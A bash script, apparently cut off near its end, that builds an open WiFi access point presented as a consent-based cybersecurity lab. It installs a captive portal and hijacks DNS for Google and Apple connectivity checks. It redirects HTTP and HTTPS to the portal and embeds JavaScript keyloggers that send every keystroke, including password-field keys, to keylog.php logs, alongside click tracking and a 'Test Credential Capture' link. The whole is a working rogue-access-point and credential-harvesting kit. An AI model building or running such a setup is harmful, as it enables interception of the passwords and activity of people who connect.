#!/bin/bash

# Enhanced Cybersecurity Lab - Complete Educational WiFi Security Demonstration
# This creates a comprehensive educational environment with full monitoring capabilities

echo "🎓 ENHANCED CYBERSECURITY LAB SETUP"
echo "===================================="
echo "Creating a comprehensive educational WiFi security demonstration"
echo "with complete network monitoring and internet access"
echo ""

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "❌ Please run as root (sudo)"
   exit 1
fi

# Configuration variables
WIFI_INTERFACE=""
LAB_SSID=""
PORTAL_DIR="/var/www/html"
LOG_DIR="/var/log/cybersec_lab"
STUDENT_DATA_DIR="/tmp/lab_students"

# Create directories
mkdir -p "$LOG_DIR"
mkdir -p "$STUDENT_DATA_DIR"

echo "🔄 STEP 1: Complete Software Installation and System Updates"
echo "=========================================================="

# CRITICAL: Complete ALL software setup BEFORE touching WiFi
echo "Performing complete system preparation..."

# Fix repository issues first
echo "Configuring repositories..."
cp /etc/apt/sources.list /etc/apt/sources.list.backup.$(date +%s) 2>/dev/null || true

cat > /etc/apt/sources.list << 'REPO_EOF'
# Kali Linux repositories
deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware
deb-src http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware
REPO_EOF

echo "Updating package databases..."
apt update --fix-missing 2>/dev/null || {
    echo "⚠️ Primary repository issues, trying mirrors..."
    cat > /etc/apt/sources.list << 'REPO_ALT_EOF'
# Alternative Kali mirrors
deb http://mirror.kali.org/kali kali-rolling main contrib non-free non-free-firmware
deb-src http://mirror.kali.org/kali kali-rolling main contrib non-free non-free-firmware
REPO_ALT_EOF
    apt update --fix-missing || {
        echo "⚠️ Repository issues persist. Continuing with existing packages..."
    }
}

echo "Installing all required packages..."
apt install -y apache2 dnsmasq hostapd php tshark tcpdump iw wireless-tools net-tools iptables curl wget unzip 2>/dev/null || {
    echo "⚠️ Some packages may already be installed"
}

echo "Installing additional monitoring tools..."
apt install -y wireshark-common aircrack-ng ettercap-text-only 2>/dev/null || true

echo "Setting up web server..."
systemctl enable apache2
systemctl start apache2

# Enable packet capture for non-root (for tshark)
echo "Configuring packet capture permissions..."
usermod -a -G wireshark root 2>/dev/null || true

echo "✅ All software installation completed"

echo ""
echo "📝 STEP 2: Network Configuration"
echo "==============================="

# Prompt for SSID name
echo "Please enter the name for your educational WiFi network:"
echo "(This will be the network name that devices will see)"
read -p "SSID Name: " LAB_SSID

if [ -z "$LAB_SSID" ]; then
    LAB_SSID="CYBERSEC_LAB_DEMO"
    echo "Using default SSID: $LAB_SSID"
fi

echo "✅ Using SSID: $LAB_SSID"

echo ""
echo "🔍 STEP 3: Network Interface Detection"
echo "====================================="

# Auto-detect WiFi interface BEFORE making changes
echo "Scanning for WiFi interfaces..."
for iface in $(iw dev 2>/dev/null | grep Interface | awk '{print $2}'); do
    if iw phy$(iw dev $iface info 2>/dev/null | grep wiphy | awk '{print $2}') info 2>/dev/null | grep -A 20 "Supported interface modes" | grep -q "* AP"; then
        WIFI_INTERFACE="$iface"
        echo "✅ Found AP-capable interface: $WIFI_INTERFACE"
        break
    fi
done

if [ -z "$WIFI_INTERFACE" ]; then
    echo "❌ No AP-capable WiFi interface found"
    echo "Available interfaces:"
    iw dev 2>/dev/null | grep Interface || echo "No wireless interfaces detected"
    echo "Please ensure you have a WiFi adapter that supports AP mode"
    exit 1
fi

# Store original interface state
ORIGINAL_MODE=$(iw dev "$WIFI_INTERFACE" info 2>/dev/null | grep type | awk '{print $2}')
echo "📝 Original interface mode: $ORIGINAL_MODE"

# Detect internet interface for sharing
INTERNET_INTERFACE=""
for iface in $(ip route show default | awk '{print $5}' | uniq); do
    if [ "$iface" != "$WIFI_INTERFACE" ] && ip link show "$iface" | grep -q "state UP"; then
        INTERNET_INTERFACE="$iface"
        echo "✅ Found internet interface: $INTERNET_INTERFACE"
        break
    fi
done

if [ -z "$INTERNET_INTERFACE" ]; then
    echo "⚠️ No internet interface found - will work in offline mode"
fi

echo ""
echo "📚 STEP 4: Creating Comprehensive Educational Web Portal"
echo "======================================================"

# Create comprehensive educational portal with enhanced monitoring disclosure
cat > "$PORTAL_DIR/index.html" << 'PORTAL_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎓 Cybersecurity Lab - Comprehensive WiFi Security Demonstration</title>
    <style>
        body { 
            font-family: 'Arial', sans-serif; 
            margin: 0; padding: 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        .container {
            max-width: 800px; margin: 0 auto;
            background: white; padding: 30px; border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .header {
            text-align: center; background: #2c3e50; color: white;
            padding: 25px; margin: -30px -30px 30px -30px;
            border-radius: 15px 15px 0 0;
        }
        .lab-badge {
            display: inline-block; background: #27ae60; color: white;
            padding: 8px 16px; border-radius: 20px; font-size: 14px;
            margin-bottom: 10px; font-weight: bold;
        }
        .warning-section {
            background: #fff3cd; border-left: 5px solid #ffc107;
            padding: 20px; margin: 20px 0; border-radius: 0 8px 8px 0;
        }
        .demo-section {
            background: #d1ecf1; border-left: 5px solid #17a2b8;
            padding: 20px; margin: 20px 0; border-radius: 0 8px 8px 0;
        }
        .monitoring-section {
            background: #f8d7da; border-left: 5px solid #dc3545;
            padding: 20px; margin: 20px 0; border-radius: 0 8px 8px 0;
        }
        .consent-section {
            background: #d4edda; border: 2px solid #28a745;
            padding: 25px; margin: 30px 0; border-radius: 10px;
        }
        .form-group { margin: 15px 0; }
        label { display: block; margin-bottom: 8px; font-weight: bold; }
        input[type="text"], input[type="email"] {
            width: 100%; padding: 12px; border: 2px solid #ddd;
            border-radius: 6px; box-sizing: border-box; font-size: 16px;
        }
        .checkbox-group {
            margin: 15px 0; padding: 15px; background: white;
            border-radius: 8px; border: 1px solid #ddd;
        }
        .checkbox-group input[type="checkbox"] {
            margin-right: 10px; transform: scale(1.2);
        }
        .checkbox-group label { margin-bottom: 0; cursor: pointer; }
        button {
            background: #28a745; color: white; padding: 15px 30px;
            border: none; border-radius: 8px; font-size: 18px;
            font-weight: bold; cursor: pointer; width: 100%;
            transition: all 0.3s ease;
        }
        button:disabled {
            background: #6c757d; cursor: not-allowed;
        }
        button:hover:enabled {
            background: #218838; transform: translateY(-2px);
        }
        .info-box {
            background: #e9ecef; padding: 15px; border-radius: 8px;
            margin: 15px 0; border-left: 4px solid #007bff;
        }
        .student-info {
            background: #f8f9fa; padding: 20px; border-radius: 8px;
            margin: 20px 0; border: 1px solid #dee2e6;
        }
        ul { padding-left: 20px; }
        li { margin: 8px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="lab-badge">🎓 EDUCATIONAL LAB</div>
            <h1>Comprehensive WiFi Security Demonstration</h1>
            <p>Advanced Cybersecurity Learning Environment</p>
        </div>

        <div class="warning-section">
            <h2>🔍 What You're Learning</h2>
            <p><strong>Welcome to our comprehensive cybersecurity educational lab!</strong> This is a <em>controlled learning environment</em> designed to teach you about WiFi security vulnerabilities through hands-on experience.</p>
            
            <div class="info-box">
                <strong>Educational Objectives:</strong>
                <ul>
                    <li>Understand comprehensive network monitoring capabilities</li>
                    <li>Experience how all digital activities can be tracked</li>
                    <li>Learn the importance of encryption and secure protocols</li>
                    <li>Practice identifying and mitigating security risks</li>
                    <li>Understand the full scope of network surveillance</li>
                </ul>
            </div>
        </div>

        <div class="demo-section">
            <h2>📊 Comprehensive Laboratory Monitoring Capabilities</h2>
            <p>This educational environment demonstrates complete network surveillance by monitoring:</p>
            <ul>
                <li><strong>🌐 Complete Web Browsing:</strong> Every website visited, page accessed, and search performed</li>
                <li><strong>⌨️ Complete Keystroke Logging:</strong> Every character typed, including passwords and private messages</li>
                <li><strong>📱 Device Information:</strong> Complete device fingerprinting and identification</li>
                <li><strong>🔒 Security Analysis:</strong> HTTPS vs HTTP usage, encryption strength assessment</li>
                <li><strong>📧 Communication Monitoring:</strong> Email, messaging, and communication patterns</li>
                <li><strong>📊 Behavioral Analysis:</strong> Usage patterns, timing, and digital behavior profiling</li>
                <li><strong>🔍 DNS Analysis:</strong> Complete domain lookup and resolution tracking</li>
                <li><strong>📦 Network Traffic:</strong> Full packet inspection and protocol analysis</li>
            </ul>
            
            <div class="info-box">
                <strong>💡 Real-World Parallel:</strong> This demonstrates the complete surveillance capabilities that malicious networks, government monitoring, or compromised infrastructure can deploy. The difference here is transparency and consent!
            </div>
        </div>

        <div class="monitoring-section">
            <h2>⚠️ Critical Understanding Required</h2>
            <ul>
                <li><strong>Complete Surveillance:</strong> Every digital action will be recorded and analyzed</li>
                <li><strong>No Privacy:</strong> Assume zero privacy while connected to this network</li>
                <li><strong>Educational Purpose:</strong> All monitoring is for cybersecurity education</li>
                <li><strong>Data Retention:</strong> Logs are kept for educational analysis and then securely deleted</li>
                <li><strong>Professional Supervision:</strong> All activities are conducted under educational oversight</li>
            </ul>
        </div>

        <div class="student-info">
            <h3>📝 Student Registration</h3>
            <p>Please provide your information for this comprehensive educational session:</p>
            
            <form id="labForm" action="register.php" method="POST">
                <div class="form-group">
                    <label for="student_name">Your Name:</label>
                    <input type="text" id="student_name" name="student_name" required>
                </div>
                
                <div class="form-group">
                    <label for="student_email">Email (for lab results):</label>
                    <input type="email" id="student_email" name="student_email" required>
                </div>
                
                <div class="form-group">
                    <label for="course_code">Course/Class Code:</label>
                    <input type="text" id="course_code" name="course_code" placeholder="e.g., CYBER101" required>
                </div>
            </form>
        </div>

        <div class="consent-section">
            <h3>✅ Comprehensive Monitoring Consent & Understanding</h3>
            <p>Please confirm your understanding by checking all boxes:</p>
            
            <div class="checkbox-group">
                <input type="checkbox" id="understand_lab" onchange="checkConsent()">
                <label for="understand_lab">
                    I understand this is a <strong>comprehensive cybersecurity monitoring demonstration</strong> in a controlled educational environment
                </label>
            </div>
            
            <div class="checkbox-group">
                <input type="checkbox" id="consent_monitoring" onchange="checkConsent()">
                <label for="consent_monitoring">
                    I <strong>consent to complete network surveillance</strong> including keystroke logging, website monitoring, and behavioral analysis for educational purposes
                </label>
            </div>
            
            <div class="checkbox-group">
                <input type="checkbox" id="no_real_data" onchange="checkConsent()">
                <label for="no_real_data">
                    I will <strong>NOT access real accounts or enter genuine personal information</strong> during this demonstration
                </label>
            </div>
            
            <div class="checkbox-group">
                <input type="checkbox" id="educational_purpose" onchange="checkConsent()">
                <label for="educational_purpose">
                    I understand this lab teaches <strong>comprehensive network security awareness</strong> and will apply these lessons to protect myself online
                </label>
            </div>
            
            <div class="checkbox-group">
                <input type="checkbox" id="final_agreement" name="lab_consent" onchange="checkConsent()">
                <label for="final_agreement">
                    <strong>I agree to participate</strong> in this comprehensive cybersecurity monitoring demonstration under these terms
                </label>
            </div>
        </div>
        
        <button type="submit" form="labForm" id="submitBtn" disabled>
            🚀 BEGIN COMPREHENSIVE MONITORING EXPERIENCE
        </button>
        
        <div class="info-box" style="margin-top: 20px;">
            <strong>🛡️ Remember:</strong> On real networks, always use VPN encryption, verify network authenticity, avoid sensitive activities on public WiFi, and maintain digital privacy awareness!
        </div>
    </div>

    <script>
        function checkConsent() {
            const checkboxes = ['understand_lab', 'consent_monitoring', 'no_real_data', 'educational_purpose', 'final_agreement'];
            const submitBtn = document.getElementById('submitBtn');
            
            const allChecked = checkboxes.every(id => document.getElementById(id).checked);
            submitBtn.disabled = !allChecked;
            
            if (allChecked) {
                submitBtn.style.background = '#28a745';
                submitBtn.textContent = '🚀 BEGIN COMPREHENSIVE MONITORING EXPERIENCE';
            }
        }
        
        // Comprehensive keystroke monitoring with full transparency
        let keystrokeCount = 0;
        let sessionActive = false;
        
        document.addEventListener('keydown', function(e) {
            // Only monitor after consent
            if (document.getElementById('final_agreement').checked) {
                sessionActive = true;
                keystrokeCount++;
                
                // Log comprehensive keystroke data
                logComprehensiveKeystroke(e.key, e.target.name || e.target.id || 'general', e.target.type || 'text');
                
                // Show educational feedback
                if (keystrokeCount % 25 === 0) {
                    console.log(`🔍 Educational Note: ${keystrokeCount} keystrokes monitored for comprehensive security analysis`);
                }
                
                // Special handling for password fields
                if (e.target.type === 'password') {
                    console.log('🔐 Educational Alert: Password field activity detected and logged');
                }
            }
        });
        
        // Monitor all form interactions
        document.addEventListener('input', function(e) {
            if (sessionActive && e.target.tagName === 'INPUT') {
                logFormInteraction({
                    field: e.target.name || e.target.id,
                    type: e.target.type,
                    value_length: e.target.value.length,
                    page: window.location.href
                });
            }
        });
        
        function logComprehensiveKeystroke(key, field, fieldType) {
            // Log all keys including special ones for comprehensive monitoring
            fetch('keylog.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `key=${encodeURIComponent(key)}&field=${encodeURIComponent(field)}&field_type=${encodeURIComponent(fieldType)}&session_type=comprehensive&page_url=${encodeURIComponent(window.location.href)}`
            }).catch(err => console.log('Comprehensive logging failed:', err));
        }
        
        function logFormInteraction(data) {
            fetch('keylog.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `activity_type=form_interaction&data=${encodeURIComponent(JSON.stringify(data))}&page_url=${encodeURIComponent(window.location.href)}`
            }).catch(err => console.log('Form interaction logging failed:', err));
        }
        
        // Form validation
        document.getElementById('labForm').addEventListener('submit', function(e) {
            const checkboxes = ['understand_lab', 'consent_monitoring', 'no_real_data', 'educational_purpose', 'final_agreement'];
            const allChecked = checkboxes.every(id => document.getElementById(id).checked);
            
            if (!allChecked) {
                e.preventDefault();
                alert('Please review and agree to all comprehensive monitoring terms before proceeding.');
            }
        });
    </script>
</body>
</html>
PORTAL_EOF

# Create enhanced PHP handlers for comprehensive monitoring
cat > "$PORTAL_DIR/register.php" << 'REGISTER_EOF'
<?php
// Comprehensive Educational Lab Student Registration Handler

$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

// Get comprehensive device information
$mac = trim(shell_exec("arp -n $ip 2>/dev/null | grep $ip | awk '{print \$3}' | head -1"));
if (empty($mac)) {
    $mac = 'unknown';
}

// Collect comprehensive session data
$student_data = [
    'timestamp' => $timestamp,
    'ip_address' => $ip,
    'mac_address' => $mac,
    'student_name' => $_POST['student_name'] ?? '',
    'student_email' => $_POST['student_email'] ?? '',
    'course_code' => $_POST['course_code'] ?? '',
    'user_agent' => $user_agent,
    'consent_given' => isset($_POST['lab_consent']) ? 'YES' : 'NO',
    'session_type' => 'comprehensive_monitoring'
];

// Comprehensive logging
$log_entry = sprintf(
    "[%s] COMPREHENSIVE_STUDENT_REGISTERED - Name: %s | Email: %s | Course: %s | IP: %s | MAC: %s | Consent: %s | UA: %s\n",
    $timestamp,
    $student_data['student_name'],
    $student_data['student_email'], 
    $student_data['course_code'],
    $ip,
    $mac,
    $student_data['consent_given'],
    $user_agent
);

file_put_contents('/var/log/cybersec_lab/comprehensive_registrations.log', $log_entry, FILE_APPEND | LOCK_EX);

// Grant comprehensive network access for monitoring
$auth_entry = "$ip|$mac|{$student_data['student_name']}|$timestamp|comprehensive\n";
file_put_contents('/tmp/lab_students/authorized.txt', $auth_entry, FILE_APPEND | LOCK_EX);

// Signal access control to grant internet access
file_put_contents('/tmp/lab_students/grant_access.txt', "$ip\n", FILE_APPEND | LOCK_EX);

// Redirect to comprehensive monitoring page
header('Location: lab_active.html');
exit;
?>
REGISTER_EOF

cat > "$PORTAL_DIR/keylog.php" << 'KEYLOG_EOF'
<?php
// Comprehensive Educational Keystroke and Activity Logger
error_reporting(E_ALL);
ini_set('display_errors', 0);

$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');
$key = $_POST['key'] ?? '';
$field = $_POST['field'] ?? '';
$field_type = $_POST['field_type'] ?? '';
$session_type = $_POST['session_type'] ?? 'general';
$page_url = $_POST['page_url'] ?? '';
$activity_type = $_POST['activity_type'] ?? 'keystroke';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Get comprehensive device tracking
$mac = trim(shell_exec("arp -n $ip 2>/dev/null | grep $ip | awk '{print \$3}' | head -1"));
if (empty($mac)) {
    $mac = 'unknown';
}

// Handle different types of comprehensive monitoring
switch ($activity_type) {
    case 'keystroke':
        if (!empty($key)) {
            // Comprehensive keystroke analysis including all keys
            $log_entry = "[$timestamp] COMPREHENSIVE_KEYSTROKE - IP:$ip | MAC:$mac | Field:$field | FieldType:$field_type | Key:$key | Session:$session_type | Page:$page_url | UA:$user_agent\n";
            file_put_contents('/var/log/cybersec_lab/comprehensive_keystrokes.log', $log_entry, FILE_APPEND | LOCK_EX);
            
            // Special handling for sensitive fields
            if (in_array($field_type, ['password', 'email']) || stripos($field, 'pass') !== false) {
                $sensitive_log = "[$timestamp] SENSITIVE_FIELD_ACCESS - IP:$ip | MAC:$mac | Field:$field | Type:$field_type | Key:$key\n";
                file_put_contents('/var/log/cybersec_lab/sensitive_data_access.log', $sensitive_log, FILE_APPEND | LOCK_EX);
            }
        }
        break;
        
    case 'form_interaction':
        $data = $_POST['data'] ?? '';
        $form_log = "[$timestamp] COMPREHENSIVE_FORM_INTERACTION - IP:$ip | MAC:$mac | Data:$data | Page:$page_url\n";
        file_put_contents('/var/log/cybersec_lab/comprehensive_form_interactions.log', $form_log, FILE_APPEND | LOCK_EX);
        break;
}

// Create comprehensive activity summary
$summary_entry = "[$timestamp] COMPREHENSIVE_ACTIVITY - Student:$ip | Type:$activity_type | Context:$field | Page:$page_url\n";
file_put_contents('/var/log/cybersec_lab/comprehensive_activity_summary.log', $summary_entry, FILE_APPEND | LOCK_EX);

// Return success for AJAX calls
http_response_code(200);
echo json_encode([
    'status' => 'logged', 
    'monitoring_type' => 'comprehensive', 
    'timestamp' => $timestamp
]);
?>
KEYLOG_EOF

# Create comprehensive monitoring success page
cat > "$PORTAL_DIR/lab_active.html" << 'LAB_ACTIVE_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎓 Lab Active - Comprehensive Monitoring Demonstration</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #dc3545, #fd7e14);
            margin: 0; padding: 20px; min-height: 100vh;
        }
        .container {
            max-width: 700px; margin: 0 auto; background: white;
            padding: 30px; border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .success-header {
            text-align: center; background: #dc3545; color: white;
            padding: 25px; margin: -30px -30px 30px -30px;
            border-radius: 15px 15px 0 0;
        }
        .status-active {
            background: #f8d7da; border: 2px solid #dc3545;
            padding: 20px; border-radius: 10px; margin: 20px 0;
            text-align: center;
        }
        .monitoring-info {
            background: #fff3cd; border-left: 5px solid #ffc107;
            padding: 20px; margin: 20px 0;
        }
        .test-section {
            background: #f8f9fa; padding: 20px; border-radius: 10px;
            margin: 20px 0; border: 1px solid #dee2e6;
        }
        .test-link {
            display: block; margin: 10px 0; padding: 12px 20px;
            background: #007bff; color: white; text-decoration: none;
            border-radius: 6px; text-align: center; font-weight: bold;
        }
        .test-link:hover { background: #0056b3; }
        .security-tips {
            background: #e2e3e5; padding: 20px; border-radius: 10px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-header">
            <h1>🎓 Comprehensive Monitoring Active</h1>
            <p>Complete Network Surveillance Demonstration</p>
        </div>

        <div class="status-active">
            <h2>⚠️ Complete Surveillance Active</h2>
            <p>You are now connected to the comprehensive monitoring demonstration network.</p>
            <p><strong>ALL your digital activities are being comprehensively monitored and logged.</strong></p>
            <p><em>You have full internet access while being monitored.</em></p>
        </div>

        <div class="monitoring-info">
            <h3>📊 Comprehensive Monitoring Active:</h3>
            <ul>
                <li><strong>🌐 Complete Web Browsing:</strong> Every website, page, search, and click</li>
                <li><strong>🔍 DNS Resolution:</strong> Every domain lookup and DNS query</li>
                <li><strong>⌨️ Complete Keystroke Capture:</strong> Every character typed including passwords</li>
                <li><strong>📝 Form Data Capture:</strong> All form submissions and input data</li>
                <li><strong>📱 Device Fingerprinting:</strong> Complete device identification and tracking</li>
                <li><strong>🔒 Security Analysis:</strong> Encryption usage and protocol analysis</li>
                <li><strong>📊 Behavioral Profiling:</strong> Usage patterns and digital behavior mapping</li>
                <li><strong>📦 Network Traffic:</strong> Complete packet inspection and content analysis</li>
            </ul>
        </div>

        <div class="test-section">
            <h3>🧪 Comprehensive Testing Activities</h3>
            <p>Try these activities to experience complete network monitoring:</p>
            
            <a href="https://www.google.com" class="test-link" target="_blank">
                🔍 Search the Web (All searches monitored)
            </a>
            <a href="https://www.youtube.com" class="test-link" target="_blank">
                📺 Browse YouTube (All activity tracked)
            </a>
            <a href="https://www.facebook.com" class="test-link" target="_blank">
                📱 Social Media (Complete surveillance)
            </a>
            <a href="test_form.html" class="test-link">
                📝 Test Credential Capture
            </a>
            <a href="https://www.wikipedia.org" class="test-link" target="_blank">
                📚 Browse Wikipedia (Reading habits tracked)
            </a>
        </div>

        <div class="security-tips">
            <h3>🛡️ Critical Security Lessons:</h3>
            <ul>
                <li><strong>Complete Visibility:</strong> Network operators can see ALL your activities</li>
                <li><strong>No True Privacy:</strong> Even HTTPS metadata reveals significant information</li>
                <li><strong>Keystroke Capture:</strong> Everything you type can be recorded</li>
                <li><strong>Behavioral Profiling:</strong> Your digital patterns create detailed profiles</li>
                <li><strong>VPN Protection:</strong> Only encrypted tunnels provide real privacy</li>
                <li><strong>Network Trust:</strong> Never trust public or unknown networks</li>
            </ul>
        </div>

        <div style="text-align: center; margin-top: 30px;">
            <p><strong>🎯 Educational Goal:</strong> Understand the complete scope of network surveillance and protect yourself accordingly!</p>
            <p><em>This experience shows you exactly what malicious networks can do.</em></p>
        </div>
    </div>
    
    <script>
        // Comprehensive monitoring continues on this page
        let activityCount = 0;
        let browsingSessions = [];
        
        // Enhanced keystroke monitoring
        document.addEventListener('keydown', function(e) {
            activityCount++;
            fetch('keylog.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `key=${encodeURIComponent(e.key)}&field=lab_active&field_type=monitoring_page&session_type=comprehensive&page_url=${encodeURIComponent(window.location.href)}`
            }).catch(err => console.log('Comprehensive monitoring failed:', err));
        });
        
        // Track all clicks
        document.addEventListener('click', function(e) {
            fetch('keylog.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `activity_type=click&data=${encodeURIComponent(JSON.stringify({
                    element: e.target.tagName,
                    id: e.target.id,
                    text: e.target.textContent.substring(0, 50),
                    coordinates: e.clientX + ',' + e.clientY
                }))}&page_url=${encodeURIComponent(window.location.href)}`
            }).catch(err => console.log('Click monitoring failed:', err));
        });
        
        // Periodic monitoring reminders
        setInterval(function() {
            if (activityCount > 0) {
                console.log(`🔍 Comprehensive Note: ${activityCount} activities monitored since page load`);
                console.log('🚨 Remember: ALL your digital activities are being recorded and analyzed');
            }
        }, 30000);
        
        // Track page visibility changes
        document.addEventListener('visibilitychange', function() {
            fetch('keylog.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `activity_type=visibility_change&data=${encodeURIComponent(JSON.stringify({
                    hidden: document.hidden,
                    timestamp: Date.now()
                }))}&page_url=${encodeURIComponent(window.location.href)}`
            }).catch(err => console.log('Visibility monitoring failed:', err));
        });
    </script>
</body>
</html>
LAB_ACTIVE_EOF

echo "✅ Comprehensive educational web portal created"

echo ""
echo "🛠️ STEP 5: Pre-WiFi Setup Completion"
echo "==================================="

# Set proper permissions before WiFi changes
chown -R www-data:www-data "$PORTAL_DIR"
chmod 755 "$PORTAL_DIR"
chmod 644 "$PORTAL_DIR"/*.html "$PORTAL_DIR"/*.php

echo "✅ All software and web components ready"

echo ""
echo "🔧 STEP 6: Network Interface Preparation (Pre-Monitor Mode)"
echo "========================================================"

# Now that all software is ready, prepare for monitor mode
echo "Preparing network interface for monitor mode transition..."

# Show nearby networks for educational context BEFORE mode changes
echo "Scanning nearby WiFi networks for educational context..."
timeout 10 iwlist "$WIFI_INTERFACE" scan 2>/dev/null | grep -E "ESSID|Encryption|Signal" | head -20 || echo "Scan completed"
echo ""
echo "💡 Educational Note: This shows the networks you could monitor in monitor mode"

# Clean up any existing processes before interface changes
echo "Cleaning up previous network sessions..."
pkill -f create_ap 2>/dev/null || true
pkill -f hostapd 2>/dev/null || true
pkill -f dnsmasq 2>/dev/null || true
pkill -f tcpdump 2>/dev/null || true
systemctl stop NetworkManager 2>/dev/null || true

# Reset interface to known state
echo "Resetting WiFi interface to clean state..."
ip link set "$WIFI_INTERFACE" down 2>/dev/null
ip addr flush dev "$WIFI_INTERFACE" 2>/dev/null
rfkill unblock wifi 2>/dev/null || true

echo "✅ Interface prepared for monitor mode transition"

echo ""
echo "📡 STEP 7: Monitor Mode Configuration"
echo "==================================="

# Set interface to monitor mode
echo "Setting interface to monitor mode..."
iw dev "$WIFI_INTERFACE" set type monitor 2>/dev/null || {
    echo "⚠️ Monitor mode failed, continuing with managed mode for AP"
}

# Bring interface up
ip link set "$WIFI_INTERFACE" up
sleep 2

# Verify mode
CURRENT_MODE=$(iw dev "$WIFI_INTERFACE" info 2>/dev/null | grep type | awk '{print $2}')
echo "📝 Current interface mode: $CURRENT_MODE"

# Now configure for AP mode (monitor capabilities retained)
echo "Configuring interface for Access Point operation..."
if [ "$CURRENT_MODE" = "monitor" ]; then
    # Switch from monitor to AP mode for access point functionality
    ip link set "$WIFI_INTERFACE" down
    iw dev "$WIFI_INTERFACE" set type managed 2>/dev/null || true
    sleep 1
fi

# Configure interface for AP
ip addr add 192.168.100.1/24 dev "$WIFI_INTERFACE"
LAB_IP="192.168.100.1"
ip link set "$WIFI_INTERFACE" up

echo "✅ Interface configured for comprehensive monitoring"

echo ""
echo "🎯 STEP 8: Creating Comprehensive Access Point"
echo "============================================"

# Create enhanced hostapd configuration
cat > /tmp/lab_hostapd.conf << 'HOSTAPD_EOF'
# Comprehensive Educational Lab Access Point Configuration
interface=$WIFI_INTERFACE
driver=nl80211
ssid=$LAB_SSID
hw_mode=g
channel=6
beacon_int=100
dtim_period=2

# Open network for maximum compatibility and monitoring
auth_algs=1
wpa=0
ignore_broadcast_ssid=0

# Enable comprehensive monitoring capabilities
ieee80211n=1
wmm_enabled=1
ieee80211d=1
country_code=US

# Client handling for comprehensive monitoring
macaddr_acl=0
max_num_sta=50
rts_threshold=2347
fragm_threshold=2346

# Enhanced logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
HOSTAPD_EOF

# Replace variables
sed -i "s/\$WIFI_INTERFACE/$WIFI_INTERFACE/g" /tmp/lab_hostapd.conf
sed -i "s/\$LAB_SSID/$LAB_SSID/g" /tmp/lab_hostapd.conf

# Start hostapd
echo "Starting comprehensive monitoring access point: $LAB_SSID"
hostapd /tmp/lab_hostapd.conf > "$LOG_DIR/hostapd.log" 2>&1 &
sleep 5

if ! ps aux | grep -q "[h]ostapd"; then
    echo "❌ Failed to start access point"
    echo "Check log: $LOG_DIR/hostapd.log"
    cat "$LOG_DIR/hostapd.log" 2>/dev/null || echo "No log available"
    exit 1
fi

echo "✅ Comprehensive monitoring access point '$LAB_SSID' is active"

echo ""
echo "🌐 STEP 9: Internet Access and Network Setup"
echo "=========================================="

# Configure DHCP and DNS with comprehensive logging
cat > /tmp/lab_dnsmasq.conf << 'DNSMASQ_EOF'
interface=$WIFI_INTERFACE
dhcp-range=192.168.100.50,192.168.100.150,12h
dhcp-option=3,$LAB_IP
dhcp-option=6,$LAB_IP
log-queries
log-facility=$LOG_DIR/comprehensive_dns_queries.log
no-resolv
server=8.8.8.8
server=8.8.4.4

# Comprehensive DNS monitoring - log everything
log-dhcp
dhcp-option=252,http://$LAB_IP/

# iOS and device captive portal detection
address=/captive.apple.com/$LAB_IP
address=/www.apple.com/$LAB_IP
address=/connectivitycheck.gstatic.com/$LAB_IP
address=/www.google.com/$LAB_IP
address=/www.msftncsi.com/$LAB_IP
DNSMASQ_EOF

# Replace variables
sed -i "s/\$WIFI_INTERFACE/$WIFI_INTERFACE/g" /tmp/lab_dnsmasq.conf
sed -i "s/\$LAB_IP/$LAB_IP/g" /tmp/lab_dnsmasq.conf
sed -i "s|\$LOG_DIR|$LOG_DIR|g" /tmp/lab_dnsmasq.conf

# Start DNS/DHCP
dnsmasq -C /tmp/lab_dnsmasq.conf --pid-file=/tmp/lab_dnsmasq.pid > "$LOG_DIR/dnsmasq.log" 2>&1 &

# Wait for dnsmasq
sleep 3

# Set up comprehensive firewall rules with internet access
echo "Configuring comprehensive network monitoring with internet access..."
iptables -F
iptables -t nat -F

# Allow all local traffic
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

# Initially redirect to captive portal
iptables -t nat -A PREROUTING -i "$WIFI_INTERFACE" -p tcp --dport 80 ! -d "$LAB_IP" -j DNAT --to-destination "$LAB_IP:80"
iptables -t nat -A PREROUTING -i "$WIFI_INTERFACE" -p tcp --dport 443 ! -d "$LAB_IP" -j DNAT --to-destination "$LAB_IP:80"

# Allow traffic to portal
iptables -A FORWARD -i "$WIFI_INTERFACE" -p tcp --dport 80 -d "$LAB_IP" -j ACCEPT
iptables -A FORWARD -i "$WIFI_INTERFACE" -p udp --dport 53 -j ACCEPT

# Enable internet access through primary interface if available
if [ ! -z "$INTERNET_INTERFACE" ]; then
